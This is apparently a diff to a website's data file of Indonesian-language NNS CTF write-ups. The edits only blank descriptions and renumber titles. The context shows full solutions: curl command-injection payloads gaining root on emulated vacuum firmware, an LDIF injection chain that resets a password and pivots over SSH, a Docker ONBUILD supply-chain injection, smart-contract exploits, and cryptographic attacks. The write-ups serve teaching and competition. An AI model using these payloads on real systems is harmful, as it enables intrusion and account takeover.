@@ -14,7 +14,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Blockchain",
       "NNS CTF"
     ],
-    "description": "Service Bank of NNS menerima command `settle <amount> <proof>` dan memverifikasi proof Kimchi/Mina sebelum mengurangi vault. Bug-nya ada di constraint range-check 64-bit: witness bisa dibuat untuk amount besar berbentuk:\n\n```\namount = high * 2^76 + low\n```\n\nselama bit `64..75` bernilai `0`. Bagian `high` disimpan di witness range-check yang tidak dipaksa nol, sementara service tetap memakai public `amount` penuh untuk mengurangi vault. Efeknya, withdrawal besar tetap punya bukti valid, tetapi daily limit hanya berkurang kecil dari komponen low (`10` NNS per withdrawal pada solve ini).\n\nFlag didapat setelah vault menjadi `0`, lalu menjalankan command lowercase `balance`.\n\n```\nNNS{so_tH3_M1na_P3rMu7at10N_cYCle_f0r_eaCH_bl0cK_w4s_4_lie?!}\n```",
+    "description": "",
     "problemDescription": "Service Bank of NNS menerima command `settle <amount> <proof>` dan memverifikasi proof Kimchi/Mina sebelum mengurangi vault. Bug-nya ada di constraint range-check 64-bit: witness bisa dibuat untuk amount besar berbentuk:\n\n```\namount = high * 2^76 + low\n```\n\nselama bit `64..75` bernilai `0`. Bagian `high` disimpan di witness range-check yang tidak dipaksa nol, sementara service tetap memakai public `amount` penuh untuk mengurangi vault. Efeknya, withdrawal besar tetap punya bukti valid, tetapi daily limit hanya berkurang kecil dari komponen low (`10` NNS per withdrawal pada solve ini).\n\nFlag didapat setelah vault menjadi `0`, lalu menjalankan command lowercase `balance`.\n\n```\nNNS{so_tH3_M1na_P3rMu7at10N_cYCle_f0r_eaCH_bl0cK_w4s_4_lie?!}\n```",
     "tools": [
       "Python 3",
@@ -68,7 +68,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Blockchain",
       "NNS CTF"
     ],
-    "description": "Challenge ini deploy dua kontrak: `BoardingPass` dan `CompensationFund`. Player dikasih satu boarding pass untuk flight `SK4045`, lalu fund diisi `40 ether`. Tujuannya cukup bikin `isSolved()` bernilai `true`, yaitu saat saldo fund habis.\n\nBug utamanya ada di `CompensationFund.collect()`. Kontrak mengirim ETH ke `msg.sender` dulu, baru menandai `redeemed[fundId][passId] = true` dan mengurangi `fund.balance`. Karena update state dilakukan belakangan, satu boarding pass bisa dipakai berulang lewat reentrancy.",
+    "description": "",
     "problemDescription": "Challenge ini deploy dua kontrak: `BoardingPass` dan `CompensationFund`. Player dikasih satu boarding pass untuk flight `SK4045`, lalu fund diisi `40 ether`. Tujuannya cukup bikin `isSolved()` bernilai `true`, yaitu saat saldo fund habis.\n\nBug utamanya ada di `CompensationFund.collect()`. Kontrak mengirim ETH ke `msg.sender` dulu, baru menandai `redeemed[fundId][passId] = true` dan mengurangi `fund.balance`. Karena update state dilakukan belakangan, satu boarding pass bisa dipakai berulang lewat reentrancy.",
     "tools": [
       "Python 3",
@@ -126,7 +126,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Blockchain",
       "NNS CTF"
     ],
-    "description": "Target ada di `Setup.isSolved()`:\n\n- `CORE.vaultEquity() <= 100_000e6`\n- `CORE.collateral() >= 4_900_000e6`\n\nKontrak `HyperCore` punya dua komponen penting:\n\n- posisi perp long yang settle pakai `oraclePx(1)`\n- spot AMM kecil yang juga dipakai langsung sebagai oracle\n\nKarena oracle cuma `spotQuoteReserve * 1e6 / spotBaseReserve`, harga bisa dinaikkan sendiri dengan beli spot. Long perp dibuka dulu saat harga masih murah, lalu oracle digeser lewat spot buy, lalu posisi ditutup untuk mengambil profit besar dari vault.",
+    "description": "",
     "problemDescription": "Target ada di `Setup.isSolved()`:\n\n- `CORE.vaultEquity() <= 100_000e6`\n- `CORE.collateral() >= 4_900_000e6`\n\nKontrak `HyperCore` punya dua komponen penting:\n\n- posisi perp long yang settle pakai `oraclePx(1)`\n- spot AMM kecil yang juga dipakai langsung sebagai oracle\n\nKarena oracle cuma `spotQuoteReserve * 1e6 / spotBaseReserve`, harga bisa dinaikkan sendiri dengan beli spot. Long perp dibuka dulu saat harga masih murah, lalu oracle digeser lewat spot buy, lalu posisi ditutup untuk mengambil profit besar dari vault.",
     "tools": [
       "Python 3",
@@ -193,7 +193,7 @@ export const nnsCtfWriteups: WriteUp[] = [
     "analysis": "# Clean Sweep — Boot2RootIoT\n\n**Challenge:** Clean Sweep\n**Category:** Boot2RootIoT\n**Target:** `https://clean-sweep-24c5d36f2fcb.chall.nnsc.tf`\n**Goal:** Mendapatkan akses **root** dan membaca `/root/flag.txt`.",
     "solution": [
       {
-        "title": "1. Reconnaissance",
+        "title": "Reconnaissance",
         "content": "Challenge memberikan sebuah service HTTP yang tampak seperti web interface firmware robot vacuum **ECOVACS DEEBOT T9 AIVI**, firmware **1.4.9** dari tahun 2021.\n\nRequest awal:\n\n```bash\ncurl -sk https://clean-sweep-24c5d36f2fcb.chall.nnsc.tf/\n```\n\nBeberapa endpoint yang ditemukan seperti:\n\n```text\n/api\n/firmware\n/debug\n/download\n/startFct\n/reqDo\n/index.cgi\n/cgi-bin\n```\n\nSebagian besar endpoint mengembalikan `200` tetapi body kosong, sedangkan `/cgi-bin/` memberikan `404`.\n\nPada tahap ini, daripada melakukan brute-force endpoint secara terus-menerus, fokus dialihkan ke firmware karena challenge secara eksplisit mengatakan:\n\n> \"We extracted the web CGI from that firmware and are hosting it here for you.\"\n\nIni adalah indikasi kuat bahwa vulnerability dapat dianalisis dari firmware lokal.\n\n---\n\n# 2. Mendapatkan Firmware Asli\n\nUntuk memperoleh firmware T9 AIVI, digunakan `ecovacs-firmware-tools`.\n\nRepository:\n\n```bash\ngit clone https://github.com/denysvitali/ecovacs-firmware-tools.git \\\n    ~/tools/ecovacs-firmware-tools\n```\n\nBuild:\n\n```bash\ncd ~/tools/ecovacs-firmware-tools\ngo build -o ecovacs-firmware-tools .\n```\n\nTool kemudian digunakan untuk mencari firmware berdasarkan model:\n\n```bash\n~/tools/ecovacs-firmware-tools/ecovacs-firmware-tools \\\n    download --models 659yh8\n```\n\nTool mengidentifikasi:\n\n```text\nDEEBOT T9 AIVI (659yh8)\nfw0 v1.4.9\n59,611,104 bytes\n```\n\nFirmware kemudian didownload:\n\n```bash\n~/tools/ecovacs-firmware-tools/ecovacs-firmware-tools \\\n    download --models 659yh8 --download -o ~/ecovacs_fw\n```\n\nFile yang didapat:\n\n```text\n~/ecovacs_fw/659yh8_fw0_v1.4.9_1de7de90.bin\n```\n\n---\n\n# 3. Analisis Struktur Firmware\n\nFirmware tidak dikenali oleh `binwalk` secara langsung karena masih dalam format encrypted/container.\n\nTool Ecovacs kemudian digunakan untuk melihat section:\n\n```bash\n~/tools/ecovacs-firmware-tools/ecovacs-firmware-tools \\\n    decrypt --list-sections \\\n    659yh8_fw0_v1.4.9_1de7de90.bin\n```\n\nHasilnya:\n\n```text\nManifest: T9AF_px30 v1.4.9\n\nSection 0: manifest\nSection 1: pre_upgrade_script\nSection 2: normal_boot\nSection 3: normal_fs\nSection 4: mcu\nSection 5: post_upgrade_script\n```\n\nSection terpenting adalah:\n\n```text\nnormal_fs\n```\n\nKemudian seluruh firmware didecrypt:\n\n```bash\n~/tools/ecovacs-firmware-tools/ecovacs-firmware-tools \\\n    decrypt \\\n    -d 659yh8 \\\n    -p px30 \\\n    --param fw0 \\\n    --version 1 \\\n    -o decrypted \\\n    659yh8_fw0_v1.4.9_1de7de90.bin\n```\n\nOutput:\n\n```text\ndecrypted/normal_fs.img\n```\n\nFile tersebut teridentifikasi sebagai:\n\n```text\nSquashfs filesystem, little endian, version 4.0\n```\n\n---\n\n# 4. Extract Root Filesystem\n\nFilesystem kemudian diekstrak:\n\n```bash\nmkdir -p rootfs\nunsquashfs -d rootfs decrypted/normal_fs.img\n```\n\nPada extract pertama terdapat error karena direktori `rootfs/bin` sudah ada. Namun filesystem tetap berhasil diekstrak dan struktur rootfs dapat dianalisis.\n\nPencarian CGI menemukan:\n\n```text\nrootfs/etc/www/reqDo\n```\n\nPemeriksaan binary:\n\n```bash\nfile rootfs/etc/www/reqDo\n```\n\nHasil:\n\n```text\nELF 64-bit LSB executable\nARM aarch64\ndynamically linked\nwith debug_info\nnot stripped\n```\n\nIni sangat menguntungkan karena binary masih memiliki simbol dan debug information.\n\n---\n\n# 5. Reverse Engineering `reqDo`\n\nPencarian symbol:\n\n```bash\nnm -C rootfs/etc/www/reqDo\n```\n\nMenghasilkan fungsi penting:\n\n```text\ncmd_system\nSetFct\nGetCredential\nGetDevInfo\nparseJsonCmd\ngetPostData\nmain\n```\n\nHal paling menarik adalah fungsi:\n\n```text\ncmd_system()\n```\n\nReverse engineering dengan radare2 menunjukkan bahwa fungsi tersebut menggunakan:\n\n```text\npopen()\n```\n\nSecara konseptual:\n\n```c\npopen(command, \"r\");\n```\n\nArtinya, apabila attacker dapat mengontrol `command`, maka input tersebut akan dieksekusi oleh shell.\n\n---\n\n# 6. Menemukan Dispatcher JSON\n\n`main()` memperlihatkan bahwa CGI:\n\n1. Mengharapkan `POST`\n2. Mengharapkan `Content-Type: application/json`\n3. Membaca POST body\n4. Memanggil `parseJsonCmd()`\n\nPotongan alurnya secara konseptual:\n\n```text\nHTTP POST\n   |\n   v\ngetPostData()\n   |\n   v\nparseJsonCmd()\n   |\n   +--> GetWCInfo\n   +--> SetApConfig\n   +--> SetFct\n   +--> GetCredential\n   +--> GetDevInfo\n   +--> GetNetworkLog\n```\n\nDari reverse engineering `parseJsonCmd()`, key dispatcher ditemukan sebagai:\n\n```text\ntd\n```\n\nContohnya:\n\n```json\n{\n  \"td\": \"SetApConfig\"\n}\n```\n\n---\n\n# 7. Analisis `SetApConfig`\n\nReverse engineering `SetApConfig()` menunjukkan beberapa field JSON diambil:\n\n```text\nSSID\nPASSPHRASE\nsc\nsck2\nlb\n```\n\nKemudian dibuat command string:\n\n```text\ntd=\"SetApConfig\" SSID=\"%s\" PASSPHRASE=\"%s\" sc=\"%s\" sck2=\"%s\" lb=\"%s\" %s\n```\n\nCommand ini kemudian dikirim ke:\n\n```text\ncmd_system()\n```\n\ndan akhirnya:\n\n```text\npopen()\n```\n\nPada titik ini muncul indikasi **OS Command Injection**.\n\n---\n\n# 8. Menelusuri Hook Script\n\nFirmware juga menyediakan script:\n\n```text\n/etc/wifi/bumbee_hook.sh\n```\n\nBagian `CmdSetApConfig()` sangat penting.\n\nScript melakukan:\n\n```sh\nSSID2=`echo $SSID | base64 -d | cjson`\n```\n\ndan:\n\n```sh\nPWD2=`echo $PASSPHRASE | base64 -d | cjson`\n```\n\nNamun field lain digunakan secara langsung:\n\n```sh\n[ \"${sc}_\" != \"_\" ] && bumbeeStr=\"$bumbeeStr,\\\"sc\\\":\\\"${sc}\\\"\"\n[ \"${sck2}_\" != \"_\" ] && bumbeeStr=\"$bumbeeStr,\\\"sck2\\\":\\\"${sck2}\\\"\"\n[ \"${lb}_\" != \"_\" ] && bumbeeStr=\"$bumbeeStr,\\\"lb\\\":\\\"${lb}\\\"\"\n```\n\nScript lalu menjalankan:\n\n```sh\nmdsctl bumbee \"${bumbeeStr}\" ...\n```\n\nHal yang paling penting adalah **nilai `sc` tidak di-escape sebelum dimasukkan ke command string yang sebelumnya sudah berada di jalur `popen()`**.\n\nJadi kita memiliki chain:\n\n```text\nHTTP JSON\n   |\n   v\ntd = SetApConfig\n   |\n   v\nsc\n   |\n   v\nsnprintf()\n   |\n   v\ncmd_system()\n   |\n   v\npopen()\n   |\n   v\nShell command injection\n```\n\n---\n\n# 9. Validasi Command Injection\n\nSebelum membaca flag, exploit divalidasi menggunakan command benign:\n\n```bash\ncurl -sk -X POST \\\n  'https://clean-sweep-24c5d36f2fcb.chall.nnsc.tf/reqDo' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"td\":\"SetApConfig\",\"sc\":\"x\\\";id;#\",\"sck2\":\"x\",\"lb\":\"x\"}'\n```\n\nResponse:\n\n```text\nuid=0(root) gid=0(root) groups=0(root)\n```\n\nIni membuktikan bahwa command injection berjalan dan command dieksekusi sebagai:\n\n```text\nroot\n```\n\nDengan kata lain, target sudah langsung mencapai **RCE sebagai root**.\n\n---\n\n# 10. Membuktikan Akses Root\n\nSelanjutnya command enumeration sederhana:\n\n```bash\ncurl -sk -X POST \\\n  'https://clean-sweep-24c5d36f2fcb.chall.nnsc.tf/reqDo' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"td\":\"SetApConfig\",\"sc\":\"x\\\";ls /root/;#\",\"sck2\":\"x\",\"lb\":\"x\"}'\n```\n\nResponse:\n\n```text\nflag.txt\n```\n\nArtinya file target memang tersedia di:\n\n```text\n/root/flag.txt\n```\n\n---\n\n# 11. Mendapatkan Flag\n\nFinal payload:\n\n```bash\ncurl -sk -X POST \\\n  'https://clean-sweep-24c5d36f2fcb.chall.nnsc.tf/reqDo' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"td\":\"SetApConfig\",\"sc\":\"x\\\";cat /root/flag.txt;#\",\"sck2\":\"x\",\"lb\":\"x\"}'\n```\n\nResponse:\n\n```text\nNNS{7his_15_0ld_f1rMw4Re_50_0fC_tHi5_1s_e4sy_f0r_Y0U}\n```\n\n# Flag\n\n```text\nNNS{7his_15_0ld_f1rMw4Re_50_0fC_tHi5_1s_e4sy_f0r_Y0U}\n```\n\n---\n\n# 12. Vulnerability Summary\n\nRoot cause challenge ini adalah **OS Command Injection** pada CGI `reqDo`.\n\nVulnerable flow:\n\n```text\nPOST /reqDo\nContent-Type: application/json\n        |\n        v\n{\"td\":\"SetApConfig\", ...}\n        |\n        v\nparseJsonCmd()\n        |\n        v\nSetApConfig()\n        |\n        v\nsnprintf(command, ...)\n        |\n        v\ncmd_system()\n        |\n        v\npopen(command, \"r\")\n        |\n        v\nCommand Injection\n        |\n        v\nuid=0(root)\n```"
       }
     ],
@@ -213,7 +213,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Crypto",
       "NNS CTF"
     ],
-    "description": "Diberikan sebuah skrip Python `chall.py` yang mengimplementasikan kriptosistem RSA untuk mengenkripsi dua pesan yang berbeda ke dalam dua ciphertext (`c1` dan `c2`) menggunakan dua modulus yang berbeda (`N1` dan `N2`).\n\nSkrip tersebut mengekspor nilai `N1`, `N2`, `c1`, dan `c2` ke dalam berkas `output.txt`.\n\nTarget dari tantangan ini adalah merekonstruksi teks asal (*plaintext*) dari `c1`, yang memuat flag kompetisi.\n\n---",
+    "description": "",
     "problemDescription": "Diberikan sebuah skrip Python `chall.py` yang mengimplementasikan kriptosistem RSA untuk mengenkripsi dua pesan yang berbeda ke dalam dua ciphertext (`c1` dan `c2`) menggunakan dua modulus yang berbeda (`N1` dan `N2`).\n\nSkrip tersebut mengekspor nilai `N1`, `N2`, `c1`, dan `c2` ke dalam berkas `output.txt`.\n\nTarget dari tantangan ini adalah merekonstruksi teks asal (*plaintext*) dari `c1`, yang memuat flag kompetisi.\n\n---",
     "tools": [
       "Python 3",
@@ -322,11 +322,11 @@ export const nnsCtfWriteups: WriteUp[] = [
         "content": "- **Kategori:** Cryptography\n- **Judul:** From Nothing\n- **Kurva:** Hyperelliptic Curve genus 5\n\n$$\ny^2 + y = x^{11}\n$$\n\n- **Field:** $\\mathbb{F}_p$, dengan $p$ berukuran sekitar 512-bit dan memenuhi:\n\n$$\np \\equiv 1 \\pmod{11}\n$$\n\n- **Tujuan:** Mengembalikan pesan asli dari ciphertext pada Jacobian kurva.\n- **Flag:** `NNS{4nd_th3_g1ft3d_c4n_m4k3_s0m3th1ng_fr0m_n0th1ng}`\n\nChallenge ini memberikan data berupa prima $p$, polinomial $u_D(x)$ dari sebuah divisor acak $D$, serta ciphertext dalam bentuk divisor pada Jacobian.\n\nPesan asli diubah menjadi sebuah titik $P$ pada kurva, lalu titik tersebut dipetakan ke Jacobian menjadi $J(P)$. Ciphertext dibentuk sebagai:\n\n$$\nct = e \\cdot J(P)\n$$\n\nMasalahnya ada di dua tempat:\n\n1. Scalar $e$ bisa direkonstruksi dari $u_D(x)$ walaupun $v_D(x)$ tidak diberikan.\n2. Order Jacobian bisa dihitung karena kurvanya punya struktur khusus.\n\nNama challenge “From Nothing” cukup pas, karena yang dieksploitasi justru data yang tidak diberikan: $v_D(x)$.\n\n---"
       },
       {
-        "title": "1. Kebocoran Scalar dari $u_D(x)$",
+        "title": "Kebocoran Scalar dari $u_D(x)$",
         "content": "Divisor pada Jacobian hyperelliptic curve biasanya direpresentasikan dalam bentuk Mumford:\n\n$$\nD = (u_D(x), v_D(x))\n$$\n\nTetapi challenge hanya memberikan $u_D(x)$, sedangkan $v_D(x)$ disembunyikan.\n\nSekilas ini terlihat aman, tapi untuk kurva:\n\n$$\ny^2 + y = x^{11}\n$$\n\npolinomial $v_D(x)$ tidak bebas. Ia harus memenuhi relasi:\n\n$$\nv_D(x)^2 + v_D(x) \\equiv x^{11} \\pmod{u_D(x)}\n$$\n\nRelasi ini bisa diubah menjadi bentuk kuadrat sempurna:\n\n$$\n(2v_D(x) + 1)^2 \\equiv 1 + 4x^{11} \\pmod{u_D(x)}\n$$\n\nArtinya, untuk mendapatkan $v_D(x)$, cukup cari akar kuadrat dari:\n\n$$\n1 + 4x^{11}\n$$\n\nmodulo $u_D(x)$.\n\nKarena $u_D(x)$ bisa difaktorkan di $\\mathbb{F}_p$, akar kuadrat bisa dicari per faktor. Untuk setiap faktor, akar kuadrat punya dua kemungkinan, yaitu $+s$ dan $-s$. Semua kombinasi akar kemudian digabung lagi menggunakan CRT polynomial.\n\nDari hasil rekonstruksi $v_D(x)$, scalar enkripsi $e$ diambil dari koefisien konstannya:\n\n$$\ne = v_D(0)\n$$\n\nKarena ada beberapa pilihan tanda akar, kita tidak langsung dapat satu nilai $e$, tetapi daftar kandidat $e$.\n\n---"
       },
       {
-        "title": "2. Order Jacobian Bisa Direkonstruksi",
+        "title": "Order Jacobian Bisa Direkonstruksi",
         "content": "Untuk membalik ciphertext:\n\n$$\nct = e \\cdot J(P)\n$$\n\nkita butuh inverse dari $e$ modulo order grup Jacobian:\n\n$$\nd \\equiv e^{-1} \\pmod{N}\n$$\n\nSetelah itu plaintext bisa dipulihkan dengan:\n\n$$\nJ(P) = d \\cdot ct\n$$\n\nMasalah normalnya: menghitung order Jacobian genus 5 bukan hal ringan.\n\nNamun kurva yang dipakai punya bentuk spesial:\n\n$$\ny^2 + y = x^{11}\n$$\n\nKarena $p \\equiv 1 \\pmod{11}$, field mengandung akar ke-11 dari satuan. Ini membuat kurva punya struktur automorphism kuat dan berkaitan dengan cyclotomic field:\n\n$$\nK = \\mathbb{Q}(\\zeta_{11})\n$$\n\nDengan sifat Complex Multiplication, Weil root dari Frobenius bisa dicari melalui ideal di field cyclotomic tersebut.\n\nScript menggunakan pendekatan berbasis Stickelberger dan LLL:\n\n1. Bangun relasi akar ke-11 modulo $p$.\n2. Cari kernel sebagai representasi ideal.\n3. Bentuk lattice integer.\n4. Jalankan LLL.\n5. Ambil vektor pendek sebagai kandidat Jacobi sum.\n6. Hitung kandidat order Jacobian dari norm.\n\nOrder kandidat dihitung dari:\n\n$$\nN = Norm(1 - \\alpha)\n$$\n\ndengan:\n\n$$\n\\alpha = \\pm \\zeta_{11}^{k} g\n$$\n\nuntuk $k = 0,1,\\dots,10$.\n\nKarena ada faktor unit $\\pm \\zeta_{11}^k$, didapat 22 kandidat order.\n\n---"
       },
       {
@@ -495,7 +495,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Crypto",
       "NNS CTF"
     ],
-    "description": "Diberikan sebuah program Python yang memodifikasi proses pembentukan modulus RSA.\n\nPembuat challenge mengklaim bahwa dengan menggabungkan faktor prima kecil berukuran 24-bit dan faktor prima besar dinamis hingga ukuran modulus melebihi 4096-bit, sistem RSA tetap aman.\n\nCiphertext dihitung menggunakan RSA dengan eksponen publik:\n\n```python\ne = 65537\n```\n\nTujuan challenge adalah merekonstruksi plaintext berupa flag dari data publik pada `output.txt`.\n\n---",
+    "description": "",
     "problemDescription": "Diberikan sebuah program Python yang memodifikasi proses pembentukan modulus RSA.\n\nPembuat challenge mengklaim bahwa dengan menggabungkan faktor prima kecil berukuran 24-bit dan faktor prima besar dinamis hingga ukuran modulus melebihi 4096-bit, sistem RSA tetap aman.\n\nCiphertext dihitung menggunakan RSA dengan eksponen publik:\n\n```python\ne = 65537\n```\n\nTujuan challenge adalah merekonstruksi plaintext berupa flag dari data publik pada `output.txt`.\n\n---",
     "tools": [
       "Python 3",
@@ -504,11 +504,11 @@ export const nnsCtfWriteups: WriteUp[] = [
     "analysis": "# CTF Writeup: NRT\n\n**Kategori:** Cryptography\n**Difficulty:** Medium\n**Artifact:** `chall.py`, `output.txt`\n**Flag:** `NNS{n0_n33d_f0r_4ll_pr1m35}`\n\n---\n\nBagian penting dari kode:\n\n```python\nSMALL_BITS = 256\ne = 0x10001\n\n\ndef genModulus():\n    N = 1\n\n    while N.bit_length() <= SMALL_BITS:\n        p = getPrime(24)\n        assert (p - 1) % e != 0\n\n        if N % p != 0:\n            N *= p\n\n    while N.bit_length() <= 4096:\n        p = getPrime(N.bit_length())\n        N *= p\n\n    return N\n```\n\nPlaintext:\n\n```python\nflag = b\"NNS{fake_flag}\"\nassert len(flag) * 8 < SMALL_BITS\n```\n\nDari kode tersebut terdapat dua observasi penting.\n\n---",
     "solution": [
       {
-        "title": "3. Struktur Modulus RSA",
+        "title": "Struktur Modulus RSA",
         "content": "Modulus RSA dibentuk dari dua kelompok faktor:\n\n$$\nN = N_{small} \\times N_{large}\n$$\n\nDengan:\n\n$$\nN_{small} = \\prod_{i=1}^{k} p_i\n$$\n\ndimana setiap:\n\n$$\np_i < 2^{24}\n$$\n\ndan:\n\n$$\nbitlength(N_{small}) > 256\n$$\n\nSedangkan:\n\n$$\nN_{large}\n$$\n\nmerupakan hasil perkalian beberapa prima besar hingga ukuran total modulus mencapai lebih dari 4096-bit.\n\n---"
       },
       {
-        "title": "4. Plaintext Bound",
+        "title": "Plaintext Bound",
         "content": "Challenge memberikan batas:\n\n```python\nassert len(flag) * 8 < SMALL_BITS\n```\n\nKarena:\n\n$$\nSMALL\\_BITS = 256\n$$\n\nmaka:\n\n$$\nm < 2^{256}\n$$\n\nSedangkan:\n\n$$\nN_{small} > 2^{256}\n$$\n\nSehingga:\n\n$$\nm < N_{small}\n$$\n\nArtinya plaintext berada sepenuhnya dalam ruang modulus kecil dan tidak mengalami modular wrap-around.\n\n---\n\n# 5. Landasan Teori"
       },
       {
@@ -627,19 +627,19 @@ export const nnsCtfWriteups: WriteUp[] = [
         "content": "Target:\n\n```\nuid=ops,ou=staff,dc=corp,dc=nns\n```\n\nACL:\n\n```\nacl \"Helpdesk resets service account passwords\";\n\nallow(write)\n\nuserPassword\n\ngroupdn =\n\"ldap:///cn=helpdesk,\nou=groups,\ndc=corp,dc=nns\";\n```\n\n---\n\nArtinya:\n\n```\nhelpdesk\n\n   |\n\n   v\n\nreset password ops\n\n   |\n\n   v\n\nSSH srv2\n\n   |\n\n   v\n\nflag\n```\n\n---\n\n# 8. Exploit LDIF Injection\n\nKarena input dimasukkan langsung ke LDIF:\n\nFormat normal:\n\n```\ndn: user\n\nchangetype: modify\n\nreplace: attribute\n\nattribute: value\n```\n\n---\n\nKita dapat menyisipkan record kedua:\n\nContoh:\n\n```powershell\nSet-MyDirectoryAttribute `\n-Name description `\n-Value \"\nINJECT\n\ndn: uid=ereid,ou=contractors,dc=corp,dc=nns\n\nchangetype: modify\n\nreplace: title\n\ntitle: INJECT-TWO\n\"\n```\n\n---\n\nServer menerima dua operasi.\n\nHasil:\n\n```\ndescription: INJECT\n\ntitle: INJECT-TWO\n```\n\n---\n\nDengan ini:\n\n```\narbitrary LDIF modification\n```\n\ndapat dilakukan.\n\n---\n\n# 9. Abuse moddn Contractor → Staff\n\nKarena group:\n\n```\nonboarding-agents\n```\n\nmemiliki:\n\n```\nmoddn\n```\n\nkita inject:\n\n```ldif\ndn:\nuid=ereid,ou=contractors,dc=corp,dc=nns\n\nchangetype: modrdn\n\nnewrdn:\nuid=ereid\n\ndeleteoldrdn: 1\n\nnewsuperior:\nou=staff,dc=corp,dc=nns\n```\n\n---\n\nHasil:\n\nSebelum:\n\n```\nuid=ereid,ou=contractors\n```\n\nSesudah:\n\n```\nuid=ereid,ou=staff\n```\n\n---\n\n# 10. Menemukan Weak Group Membership\n\nGroup:\n\n```\nhelpdesk\n```\n\nberisi:\n\n```\ncnovak\n\nagrant\n\npdelgado\n```\n\n---\n\nContoh:\n\n```\ndn:\nuid=cnovak,ou=staff,dc=corp,dc=nns\n\nmemberOf:\ncn=helpdesk,\nou=groups,\ndc=corp,dc=nns\n```\n\n---\n\nMasalah:\n\nLDAP tidak membersihkan referensi group ketika RDN berubah.\n\n---\n\n# 11. Exploit DN/RDN Confusion\n\nRename:\n\n```\nuid=cnovak\n```\n\nmenjadi:\n\n```\nuid=vacant123\n```\n\nDengan:\n\n```ldif\ndn:\nuid=cnovak,ou=staff,dc=corp,dc=nns\n\nchangetype: modrdn\n\nnewrdn:\nuid=vacant123\n\ndeleteoldrdn: 1\n```\n\n---\n\nSetelah rename:\n\n```\nmemberOf:\nhelpdesk\n```\n\ntetap melekat.\n\n---\n\nSehingga:\n\n```\ncnovak\n\n   |\n\n   v\n\nvacant123\n\n   |\n\n   v\n\nmasih helpdesk\n```\n\n---\n\n# 12. Mengambil Identity Helpdesk\n\nAccount kita kemudian diubah menjadi:\n\n```\nuid=cnovak,ou=staff,dc=corp,dc=nns\n```\n\nDengan password:\n\n```\nSummer2026\n```\n\nSekarang identity tersebut memiliki privilege:\n\n```\nhelpdesk\n```\n\n---\n\n# 13. Reset Password ops\n\nGunakan privilege baru:\n\nTarget:\n\n```\nuid=ops,ou=staff,dc=corp,dc=nns\n```\n\nLDIF:\n\n```ldif\ndn:\nuid=ops,ou=staff,dc=corp,dc=nns\n\nchangetype: modify\n\nreplace: userPassword\n\nuserPassword:\nNNS-temp-2026!\n```\n\n---\n\nJalankan:\n\n```bash\nldapmodify \\\n-x \\\n-H ldap://dir:3389 \\\n-D \"uid=cnovak,ou=staff,dc=corp,dc=nns\" \\\n-w Summer2026\n```\n\nOutput:\n\n```\nmodifying entry\nuid=ops,ou=staff,dc=corp,dc=nns\n```\n\nPassword berhasil diubah.\n\n---\n\n# 14. Pivot ke srv2\n\nDari environment:\n\n```bash\ncat /etc/hosts\n```\n\nDidapat:\n\n```\n172.20.127.225 srv2\n```\n\n---\n\nSSH:\n\n```bash\nssh ops@srv2\n```\n\nPassword:\n\n```\nNNS-temp-2026!\n```\n\n---\n\nBerhasil masuk:\n\n```\nops@srv2:~$\n```\n\n---\n\n# 15. Membaca Flag\n\nCari file:\n\n```bash\nls\n```\n\nOutput:\n\n```\nflag.txt\n```\n\n---\n\nBaca:\n\n```bash\ncat flag.txt\n```\n\n---\n\n# 16. Kesimpulan\n\nChallenge ini memanfaatkan kombinasi beberapa kelemahan:"
       },
       {
-        "title": "1. LDAP/LDIF Injection",
+        "title": "LDAP/LDIF Injection",
         "content": "Input user dimasukkan langsung ke LDIF:\n\n```\nValue\n |\n v\nLDAP Operation\n```\n\n---"
       },
       {
-        "title": "2. Self-Service ACL Terlalu Luas",
+        "title": "Self-Service ACL Terlalu Luas",
         "content": "User dapat memodifikasi attribute sendiri.\n\n---"
       },
       {
-        "title": "3. Weak Group Membership Handling",
+        "title": "Weak Group Membership Handling",
         "content": "Rename LDAP account tidak membersihkan referensi group.\n\n---"
       },
       {
-        "title": "4. Privilege Escalation",
+        "title": "Privilege Escalation",
         "content": "Rantai exploit:\n\n```\nereid\n\n |\n\n v\n\nLDIF Injection\n\n |\n\n v\n\nContractor -> Staff\n\n |\n\n v\n\nRDN confusion\n\n |\n\n v\n\nHelpdesk privilege\n\n |\n\n v\n\nReset ops password\n\n |\n\n v\n\nSSH srv2\n\n |\n\n v\n\nFlag\n```\n\n---\n\n# Flag\n\n```\nNNS{4_j0B_71tle_15_no7_4n_acCes5_coN7R0l_bouND4ry_4nd_4Pp4ren71Y_7H3R3_aRe_4ctUa1_oR65_tha7_Do_stUp1D_sH17_l1K3_tH1s}\n```"
       },
       {
@@ -664,7 +664,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Devops",
       "NNS CTF"
     ],
-    "description": "Challenge ini bukan pwn native binary. Bug utamanya ada di supply chain build image:\n\n1. Registry bisa di-`push` tanpa auth.\n2. Tag image page deterministik, yaitu `sha256(content)[:12]`.\n3. Builder tidak menimpa tag `pages:<hash>` yang sudah ada.\n4. Image page itu dipakai sebagai base image lewat `FROM page0 AS content0`.\n5. Karena base image boleh punya `ONBUILD`, kita bisa menyuntik instruksi Docker tambahan.\n\nPayload `ONBUILD` yang dipakai:\n\n```dockerfile\nCOPY --from=theme /flag.txt /page\n```\n\nSaat builder menjalankan `FROM page0 AS content0`, trigger itu aktif dan menyalin `/flag.txt` dari stage `theme` ke `/page`. Setelah itu Dockerfile normal challenge menyalin `/page` ke `index.html`, jadi flag masuk ke image final.",
+    "description": "",
     "problemDescription": "Challenge ini bukan pwn native binary. Bug utamanya ada di supply chain build image:\n\n1. Registry bisa di-`push` tanpa auth.\n2. Tag image page deterministik, yaitu `sha256(content)[:12]`.\n3. Builder tidak menimpa tag `pages:<hash>` yang sudah ada.\n4. Image page itu dipakai sebagai base image lewat `FROM page0 AS content0`.\n5. Karena base image boleh punya `ONBUILD`, kita bisa menyuntik instruksi Docker tambahan.\n\nPayload `ONBUILD` yang dipakai:\n\n```dockerfile\nCOPY --from=theme /flag.txt /page\n```\n\nSaat builder menjalankan `FROM page0 AS content0`, trigger itu aktif dan menyalin `/flag.txt` dari stage `theme` ke `/page`. Setelah itu Dockerfile normal challenge menyalin `/page` ke `index.html`, jadi flag masuk ke image final.",
